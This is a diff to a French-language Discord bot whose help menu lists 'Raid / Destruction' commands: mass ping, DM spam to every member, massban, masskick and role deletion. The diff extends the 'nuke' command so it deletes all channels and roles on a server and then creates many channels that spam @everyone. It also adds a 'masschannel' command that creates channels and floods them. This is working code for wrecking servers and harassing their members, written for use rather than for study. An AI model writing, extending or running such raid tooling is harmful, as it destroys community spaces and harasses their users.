@@ -393,8 +393,9 @@ async def help_command(ctx: commands.Context, category: Optional[str] = None):
             "title": "Raid / Destruction",
             "icon": "☣️",
             "cmds": [
-                ".nuke - Détruit le serveur (channels, roles)",
+                ".nuke [nom] [nb] [msg] - Détruit tout + recrée salons/spam",
                 ".raid <nb> <msg> - Mass ping + delete channels",
+                ".masschannel <nb> <nom> [msg] - Crée salons + spam dedans",
                 ".spam <nb> <msg> - Spam dans le salon",
                 ".spamid <user_id> <nb> <msg> - Spam MP à un user",
                 ".spamall <nb> <msg> - Spam MP à tous les membres",
@@ -407,8 +408,7 @@ async def help_command(ctx: commands.Context, category: Optional[str] = None):
                 ".massnick <base> - Change nick de tous aléatoirement",
                 ".massban - Ban tous les membres possibles",
                 ".masskick - Kick tous les membres possibles",
-                ".massrole <action> <nb> [nom] - Crée/Supprime rôles",
-                ".channelspam <nb> [nom] - Crée plein de salons"
+                ".massrole <action> <nb> [nom] - Crée/Supprime rôles"
             ]
         },
         "antiraid": {
@@ -598,19 +598,51 @@ async def clearmydms(ctx: commands.Context):
     print(f"{count} messages supprimés en DM.")
 
 @bot.command()
-async def nuke(ctx: commands.Context):
-    """Nuke le serveur: supprime channels et roles."""
+async def nuke(ctx: commands.Context, channels_name: str = "nuked", amount: int = 0, *, spam_msg: str = ""):
+    """Nuke le serveur: supprime tout et crée salons optionnels."""
     await safe_delete(ctx.message)
     guild = ctx.guild
+    
+    # 1. Suppression
     tasks = []
     for channel in list(guild.channels):
         tasks.append(channel.delete(reason="Nuke"))
     for role in list(guild.roles):
         if role != guild.default_role:
             tasks.append(role.delete(reason="Nuke"))
-    await asyncio.gather(*tasks, return_exceptions=True)
-    await guild.create_text_channel("nuked")
-    # await safe_send(ctx.channel, "Serveur nuké!", delete_after=5)
+    
+    try:
+        await asyncio.gather(*tasks, return_exceptions=True)
+    except:
+        pass
+
+    # 2. Création (si demandé)
+    if amount > 0:
+        for i in range(amount):
+            try:
+                chan = await guild.create_text_channel(f"{channels_name}-{i}")
+                if spam_msg:
+                    for _ in range(5): # Petit spam par salon
+                        await safe_send(chan, f"@everyone {spam_msg}")
+            except:
+                pass
+    else:
+        await guild.create_text_channel(channels_name)
+
+@bot.command()
+async def masschannel(ctx: commands.Context, amount: int, name: str, *, message: str = ""):
+    """Crée des salons et spam dedans."""
+    await safe_delete(ctx.message)
+    guild = ctx.guild
+    for i in range(amount):
+        try:
+            chan = await guild.create_text_channel(f"{name}-{i}")
+            if message:
+                for _ in range(3):
+                    await safe_send(chan, f"@everyone {message}")
+        except:
+            pass
+    await safe_send(ctx.channel, f"✅ {amount} salons créés.", delete_after=5)
 
 @bot.command()
 async def joinvc(ctx: commands.Context):
